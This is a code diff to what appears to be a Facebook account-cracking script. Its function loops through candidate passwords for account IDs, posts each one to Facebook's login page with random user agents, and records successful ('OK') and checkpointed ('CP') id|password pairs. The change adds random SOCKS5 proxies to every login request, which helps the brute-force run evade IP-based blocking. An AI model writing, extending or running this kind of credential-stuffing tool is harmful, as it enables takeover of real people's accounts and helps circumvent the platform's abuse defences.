@@ -1507,7 +1507,7 @@ fankysayang = [
 ]
 def mbasic(idf,pwv):
 	global loop,ok,cp
-	prog.update(des, description=f"[[bold green] UPDATE FANKY86 [bold white]] [[bold green]{idf}[bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
+	prog.update(des, description=f"[[bold green] UPDATE FANKY86 [bold white]] [[bold green] {idf} [bold white]] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
 	prog.advance(des)
 	ua2 = random.choice(fankysayang)
 	ua = random.choice(dalvik())
@@ -1515,6 +1515,8 @@ def mbasic(idf,pwv):
 	for pw in pwv:
 		try:
 			if 'ya' in ualuh: ua = ualu[0]
+			nip = random.choice(prox)
+			proxs = {'http': 'socks5://' + nip}
 			headers = {
 				'authority': 'vi-vn.facebook.com',
 				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -1572,7 +1574,7 @@ def mbasic(idf,pwv):
 				'next':''
 			}
 			login_url = 'https://vi-vn.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
-			po= ses.post(login_url, headers=head, data=data)
+			po= ses.post(login_url, headers=head, data=data, proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
 				cp += 1
 				tree = Tree(Panel.fit(f"""{K2}{idf}|{pw}{P2}""", style=f"{color_panel}"),guide_style="bold grey100")
